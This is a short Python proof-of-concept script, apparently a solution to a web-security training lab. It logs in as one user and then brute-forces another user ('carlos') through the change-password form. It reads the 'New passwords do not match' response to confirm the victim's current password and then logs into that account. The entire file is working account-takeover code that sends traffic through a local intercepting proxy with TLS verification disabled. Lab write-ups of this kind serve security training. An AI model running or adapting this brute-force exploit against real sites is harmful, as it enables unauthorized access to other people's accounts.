import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

def access_carlos_acc(s, url):
    print("login into wiener acc....")
    login_url = url + "/login"
    login_data = {"username": "wiener", "password": "peter"}
    r = s.post(login_url, data=login_data, verify=False, proxies=proxy)
    
    sys.stdout.write("bruteforcing carlos pass....")
    change_pass_url = url + "/my-account/change-password"
    with open("passwords.txt", "r") as f:
        lines = f.readlines()
        
    carlos_pwd = None
    for pwd in lines:
        password = pwd.strip()
        change_pass_data = {"username":"carlos", "current-password": password, "new-password-1":"password1", "new-password-2":"password2"}
        r = s.post(change_pass_url, data=change_pass_data, verify=False, proxies=proxy)
        if "New passwords do not match" in r.text:
            carlos_pwd = password
            sys.stdout.write("found password: " + carlos_pwd + "\n")
            break
    if carlos_pwd:
        # login
        login_data = {"username": "carlos", "password": carlos_pwd}
        r = s.post(login_url, data=login_data, verify=False, proxies=proxy)
        if "Log out" in r.text:
            sys.stdout.write("successfully logged into carlos account\n")
        else:
            sys.stdout.write("could not log into carlos account\n")
            sys.exit(1)
    else:
        sys.stdout.write("could not find carlos password\n")
        sys.exit(1)

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 POC.py <url>")
        sys.exit(1)
    
    s = requests.Session()
    url = sys.argv[1]
    access_carlos_acc(s, url)

if __name__ == "__main__":
    main()